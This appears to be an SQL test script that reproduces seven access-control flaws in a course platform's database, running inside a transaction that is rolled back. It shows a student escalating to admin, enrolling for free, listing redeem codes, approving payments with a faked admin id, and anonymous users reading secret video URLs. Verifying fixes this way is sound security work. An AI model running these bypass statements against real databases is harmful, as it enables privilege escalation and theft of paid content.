-- Reproduces the ORIGINAL vulnerabilities. Run ONLY against a local DB built from the first 3 migrations.
-- Everything runs in a transaction and is rolled back.
begin;
-- Isolate V5: drop only the two self-referencing policies so other bugs are observable.
drop policy "Admins can view all profiles" on public.profiles;
drop policy "Admins can update all profiles" on public.profiles;
insert into auth.users (id, aud, role, email) values ('11111111-1111-1111-1111-111111111111','authenticated','authenticated','s@x.com'),('22222222-2222-2222-2222-222222222222','authenticated','authenticated','v@x.com');
insert into public.profiles (id,email,role) values ('11111111-1111-1111-1111-111111111111','s@x.com','student'),('22222222-2222-2222-2222-222222222222','v@x.com','student');
insert into public.courses (id,title,slug,price,is_published) values ('33333333-3333-3333-3333-333333333333','c','c',1000,true);
insert into public.lessons (course_id,title,video_url,is_published) values ('33333333-3333-3333-3333-333333333333','l','https://cdn/secret.mp4',true);
insert into public.redeem_codes (code,course_id,created_by) values ('SECRET-CODE','33333333-3333-3333-3333-333333333333','11111111-1111-1111-1111-111111111111');
insert into public.manual_payments (id,user_id,course_id,amount) values ('44444444-4444-4444-4444-444444444444','22222222-2222-2222-2222-222222222222','33333333-3333-3333-3333-333333333333',1000);
select set_config('request.jwt.claims','{"sub":"11111111-1111-1111-1111-111111111111","role":"authenticated"}',true);
set local role authenticated;
savepoint a; select 'V5 admin policy query: ' || count(*) from public.profiles; rollback to a;
savepoint g; update public.profiles set role='admin' where id='11111111-1111-1111-1111-111111111111'; select 'V1 student role after self-update: ' || role from public.profiles where id='11111111-1111-1111-1111-111111111111'; rollback to g;
savepoint h; insert into public.profiles (id,email) values ('55555555-5555-5555-5555-555555555555','n@x.com'); select 'V6 profile insert by user: allowed'; rollback to h;
savepoint b; insert into public.enrollments (user_id,course_id,status,expires_at) values ('11111111-1111-1111-1111-111111111111','33333333-3333-3333-3333-333333333333','active',now()+interval '100 years'); select 'V2 student self-enrolled active: VULNERABLE'; rollback to b;
savepoint c; select 'V3 student lists codes: ' || string_agg(code, ',') from public.redeem_codes; rollback to c;
savepoint d; set local role anon; select 'V4 anon reads video_url: ' || video_url from public.lessons; rollback to d;
savepoint e; select 'V7 student approves payment passing fake admin id: ' || (public.approve_manual_payment('44444444-4444-4444-4444-444444444444','11111111-1111-1111-1111-111111111111') is not null); rollback to e;
savepoint f; select 'V7 student redeems code for another account: ' || (public.redeem_code('SECRET-CODE','22222222-2222-2222-2222-222222222222') is not null); rollback to f;
rollback;
